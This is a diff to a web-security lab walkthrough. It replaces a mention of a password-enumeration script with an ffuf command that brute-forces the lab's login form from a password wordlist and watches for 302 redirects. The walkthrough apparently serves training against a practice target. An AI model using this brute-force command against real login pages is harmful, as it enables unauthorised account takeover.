@@ -14,7 +14,15 @@ The username and password lists are provided in the lab description.
 
 The login page renders an `Invalid username` error if the username is invalid. We have to use the `enumerate_username.py` script to find a valid username.
 
-After finding a valid `username` we have to use the `enumerate_password.py` script with found username to get the user's password.
+After finding a valid `username` use the below script to extract `password`.
+
+```bash
+ffuf -X POST \
+    -u https://YOUR-LAB-ID.web-security-academy.net/login \
+    -d "username=YOUR-FOUND-USERNAME&password=FUZZ" \
+    -w passwords.txt \
+    -mc 302
+```
 
 Now log in with the retrieved username and password to solve the lab.
 
